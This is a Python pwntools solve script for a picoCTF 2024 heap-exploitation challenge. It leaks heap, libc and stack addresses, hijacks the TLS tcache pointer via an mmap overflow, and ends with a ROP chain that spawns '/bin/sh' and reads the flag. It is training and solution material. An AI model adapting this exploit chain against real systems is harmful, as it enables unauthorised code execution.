#!/usr/bin/env python3
# high frequency troubles - picoCTF 2024 (Hard) by pepsipu
# Port of satoki's deterministic exploit (ptrlib -> pwntools).
# TLS tcache pointer hijack via mmap overflow -> AAR/AAW -> stack leak -> ROP.
from pwn import *

context.arch = "amd64"
context.log_level = "info"
elf = ELF("./hft", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

HOST = args.HOST or "tethys.picoctf.net"
PORT = int(args.PORT or 61659)
sock = remote(HOST, PORT)


def sendafter(delim, data):
    sock.recvuntil(delim)
    sock.send(data)


def leak_after_echo():
    sock.recvuntil(b":[" + b"".join([]))  # placeholder not used
    sock.recvuntil(b":[")
    return u64(sock.recvuntil(b"]\n", drop=True).ljust(8, b"\x00"))


# 1) tamper top chunk size -> 0x41
sendafter(b":[PKT_RES]\n", p64(0xD28))
sock.sendline(p64(0x0) + b"A" * 0xD18 + p32(0x41))
# 2) -> tcachebins[0x20]
sendafter(b":[PKT_RES]\n", p64(0xBB0))
sock.sendline(p64(0x0) + b"B" * 0xBA8 + p32(0x441))
# 3) -> unsortedbin
sendafter(b":[PKT_RES]\n", p64(0x419))
sock.sendline(p64(0x3)[:-1])
# 4) heap leak
sendafter(b":[PKT_RES]\n", p64(0x19))
sock.sendline(p64(0x1)[:-1])
sock.recvuntil(b":[")
heap_leak = u64(sock.recvuntil(b"]\n", drop=True).ljust(8, b"\x00"))
heap_base = heap_leak - 0x21BC0
log.info("heap leak: %s  base: %s" % (hex(heap_leak), hex(heap_base)))

# 5-7) build two largebin chunks
sendafter(b":[PKT_RES]\n", p64(0x780))
sock.sendline(p64(0x0) + b"C" * 0x778 + p32(0x441))
sendafter(b":[PKT_RES]\n", p64(0xBB0))
sock.sendline(p64(0x0) + b"D" * 0xBA8 + p32(0x441))
sendafter(b":[PKT_RES]\n", p64(0xBB0))
sock.sendline(p64(0x3)[:-1])

# 8) fake tcache controller no.1 (largebin address)
sendafter(b":[PKT_RES]\n", p64(0x90))
sock.sendline(p64(0x1) + p64(0x1) + p64(0x0) * 0xF + p64(heap_base + 0x65BC0)[:-1])
# 9) mmap overflow -> TLS tcache ptr = fake controller no.1
sendafter(b":[PKT_RES]\n", p64(0x22000))
sock.sendline(p64(0x0) + b"E" * 0x236D8 + p64(heap_base + 0x21C10)[:-1])

# 10) libc leak
sendafter(b":[PKT_RES]\n", p64(0x18))
sock.sendline(p64(0x1)[:-1])
sock.recvuntil(b":[")
libc_leak = u64(sock.recvuntil(b"]\n", drop=True).ljust(8, b"\x00"))
libc.address = libc_leak - 0x21A0D0
log.info("libc leak: %s  base: %s" % (hex(libc_leak), hex(libc.address)))

# 11) fake controller no.2 (points at stack-address holder in libc)
sendafter(b":[PKT_RES]\n", p64(0x90))
sock.sendline(p64(0x1) + p64(0x1) + p64(0x0) * 0xF + p64(libc.address + 0x21AA10)[:-1])
# 12) TLS tcache ptr = fake controller no.2
sendafter(b":[PKT_RES]\n", p64(0x22000))
sock.sendline(p64(0x0) + b"F" * 0x466D8 + p64(heap_base + 0x21CB0)[:-1])

# 13) stack leak
sendafter(b":[PKT_RES]\n", p64(0x18))
sock.sendline(p64(0x1)[:-1])
sock.recvuntil(b":[")
stack_leak = u64(sock.recvuntil(b"]\n", drop=True).ljust(8, b"\x00"))
ret = stack_leak - 0x150
log.info("stack leak: %s  ret: %s" % (hex(stack_leak), hex(ret)))

# 14) fake controller no.3 -> ret-0x18
sendafter(b":[PKT_RES]\n", p64(0x90))
sock.sendline(p64(0x1) + p64(0x1) + p64(0x0) * 0xF + p64(ret - 0x18)[:-1])
# 15) TLS tcache ptr = fake controller no.3
sendafter(b":[PKT_RES]\n", p64(0x22000))
sock.sendline(p64(0x0) + b"G" * 0x696D8 + p64(heap_base + 0x21D50)[:-1])

# 16) overwrite return address with ROP -> system("/bin/sh")
pop_rdi = libc.address + next(libc.search(asm("pop rdi; ret")))
ret_g = libc.address + next(libc.search(asm("ret")))
binsh = libc.address + next(libc.search(b"/bin/sh"))
payload = p64(pop_rdi) + p64(binsh) + p64(ret_g) + p64(libc.sym["system"])
sendafter(b":[PKT_RES]\n", p64(0x18))
sock.sendline(p64(0x0) + b"H" * 0x18 + payload)

sock.sendline(b"cat flag.txt; echo PWNED")
try:
    print(sock.recvuntil(b"PWNED", timeout=6).decode(errors="replace"))
except EOFError:
    print("[!] EOF")
sock.interactive()
